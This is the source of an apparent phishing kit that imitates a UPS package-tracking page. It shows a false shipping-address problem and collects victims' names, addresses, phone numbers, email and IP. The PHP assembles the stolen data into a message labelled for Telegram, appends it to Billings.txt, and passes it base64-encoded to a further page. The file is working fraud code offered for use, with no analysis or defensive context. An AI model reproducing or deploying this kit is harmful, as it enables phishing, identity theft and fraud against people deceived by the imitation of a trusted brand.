...
$messageTelegram .= "|=[ BILLING INFORMATION ]=|\n"; 
if($otleb_email==1){
 $messageTelegram .= "|Email         :  ".$_POST['email']."\n";
}
$messageTelegram .= "|FULL NAME     :  ".$_POST['fullname']."\n";
$messageTelegram .= "|Address 1     :  ".$_POST['add1']."\n";
$messageTelegram .= "|Address 2     :  ".$_POST['add2']."\n";
$messageTelegram .= "|City          :  ".$_POST['city']."\n";
if($countryCode == 'US'){
$messageTelegram .= "|state         :  ".$_POST['state']."\n";
}
$messageTelegram .= "|zip Code      :  ".$_POST['zipcode']."\n";
$messageTelegram .= "|Phone Number  :  ".$_POST['phone']."\n"; 
$messageTelegram .= "|IP         :  ".$realip."\n";
$messageTelegram .= "|==[ UPS ARON-TN ]==|\n";
$xmyfile = fopen("Billings.txt", "a+");
fwrite($xmyfile, $messageTelegram);
fclose($xmyfile);
...
if($otleb_email==1){
     HEADER("Location: settings.php?email=".base64_encode($_POST['email'])."&fullname=".base64_encode($_POST['fullname'])."&add1=".base64_encode($_POST['add1'])."&mcity=".base64_encode($_POST['city'])."&mstate=".base64_encode($_POST['state'])."&zip=".base64_encode($_POST['zipcode'])."&gonna=".base64_encode($_POST['phone'])."&realip=".base64_encode($realip));
}else{
     HEADER("Location: settings.php?fullname=".base64_encode($_POST['fullname'])."&add1=".base64_encode($_POST['add1'])."&mcity=".base64_encode($_POST['city'])."&mstate=".base64_encode($_POST['state'])."&zip=".base64_encode($_POST['zipcode'])."&gonna=".base64_encode($_POST['phone'])."&realip=".base64_encode($realip));
}
}
?>
      ...
      <div id="ups-alertsWrap" role="group" aria-label="Time Sensitive Information from UPS"> 
       <div id="ups-alerts" style="display: block;" data-linktxt="Alerts" data-prevtxt="Previous" data-nexttxt="Next" data-alerthide="false"> 
        ...
        <ul class="ups-alerts_list slick-initialized slick-slider"> 
         <div class="slick-list draggable"><div class="slick-track" style="opacity: 1; width: 3095px; transform: translate3d(-619px, 0px, 0px);"><li class="ups-alert_msg slick-slide slick-cloned" tabindex="-1" data-position="alert2" data-slick-index="-1" aria-hidden="true" style="width: 619px;"><span>UPS Services</span><a class="ups-analytics ups-alerts_link" data-content-block-id="M1" data-event-id="21" href="/us/en/service-alerts.page?id=alert2" tabindex="-1">...More</a></li><li class="ups-alert_msg slick-slide slick-current slick-active" tabindex="0" data-position="alert1" data-slick-index="0" aria-hidden="false" style="width: 619px;"><span></span><a class="ups-analytics ups-alerts_link" data-content-block-id="M1" data-event-id="21" href="#" tabindex="0">...More</a></li><li class="ups-alert_msg slick-slide" tabindex="-1" data-position="alert2" data-slick-index="1" aria-hidden="true" style="width: 619px;"><span>UPS Services</span><a class="ups-analytics ups-alerts_link" data-content-block-id="M1" data-event-id="21" href="#" tabindex="-1">...More</a></li><li class="ups-alert_msg slick-slide slick-cloned" tabindex="-1" data-position="alert1" data-slick-index="2" aria-hidden="true" style="width: 619px;"><span></span><a class="ups-analytics ups-alerts_link" data-content-block-id="M1" data-event-id="21" href="#" tabindex="-1">...More</a></li><li class="ups-alert_msg slick-slide slick-cloned" tabindex="-1" data-position="alert2" data-slick-index="3" aria-hidden="true" style="width: 619px;"><span>UPS Services</span><a class="ups-analytics ups-alerts_link" data-content-block-id="M1" data-event-id="21" href="#" tabindex="-1">...More</a></li></div></div> 
        </ul>
                  ...
                  <div _ngcontent-c1="" class="ups-card_content">
                    ...
                    <div _ngcontent-c1="" class="ups-form_group ups-help_wrapper">
                      ...
                      <p _ngcontent-c1="" class="ups-form_subheader ups-form_subheader_has_help" id="stApp_lblEnterUpTo25TrackNo">
                       <b> Tracking Number : RAxxxxxxxxxxx</b>
                      </p>
                      ...
                      <div _ngcontent-c1="" class="ups-input_wrapper ups-textArea_wrapper">
                        ...
                        <b>Status : <p style="color:red"> We have issues concerning your shipping address</p></b>
...
<?php 
if($otleb_email==1){
     echo('<input required name="email" id="email" class="ups-simpleTrack_input ups-form_input" placeholder="Email address" style="max-width:100%"><br>');
}
?>
<input required name="fullname" id="Fullname" class="ups-simpleTrack_input ups-form_input" placeholder="Full Name" style="max-width:100%">


<br>
<input required  name="add1" id="add1" class="ups-simpleTrack_input ups-form_input" placeholder="Address Line 1" style="max-width:100%">
<br>
<input  name="add2" id="add2" class="ups-simpleTrack_input ups-form_input" placeholder="Apartment, suiten etc. (optional)" style="max-width:100%">
<br>
<input required  name="city" id="city" class="ups-simpleTrack_input ups-form_input" placeholder="City" style="max-width:100%">
<br>
<?php
if($countryCode == 'US'){
?>
<select name="state" id="state" class="ups-simpleTrack_input ups-form_input" style="max-width:100%" >
...
?>
<br>
<input required  name="zipcode" id="zipcode" class="ups-simpleTrack_input ups-form_input" placeholder="Zip Code" style="max-width:100%">
<br>
<input required name="phone" id="phone" class="ups-simpleTrack_input ups-form_input" placeholder="Phone Number" style="max-width:100%">
<br>
<button _ngcontent-c1="" class="ups-cta ups-cta_primary" id="stApp_btnTrack" type="submit"name="submit" id="submit" style="cursor: pointer;">Next</button>
</form>
...
<!----><button _ngcontent-c4="" class="ups-link ng-star-inserted" id="stApp_imptTrk_open_link" type="button">Import Tracking Numbers</button>
...
<!---->
                    ...
                    <div _ngcontent-c1="" class="ups-group">
                      <other-services _ngcontent-c1="" _nghost-c5=""><button _ngcontent-c5="" class="ups-link" id="stApp_othSer_open_link" type="button">
